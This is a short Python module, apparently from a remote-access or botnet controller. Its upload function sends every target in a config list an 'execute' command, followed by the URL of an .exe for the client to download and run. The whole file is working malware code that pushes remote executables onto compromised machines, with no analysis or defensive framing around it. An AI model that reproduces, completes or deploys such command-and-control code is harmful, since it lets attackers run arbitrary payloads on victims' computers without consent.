import config


def upload(url):
    """
    This would send a download link to the client to execute and run.
    :param url: URL of the exe file
    """
    for target in config.targets:
        config.send_to_client(target, 'execute', response=False)
    for target in config.targets:
        config.send_to_client(target, url, response=False)
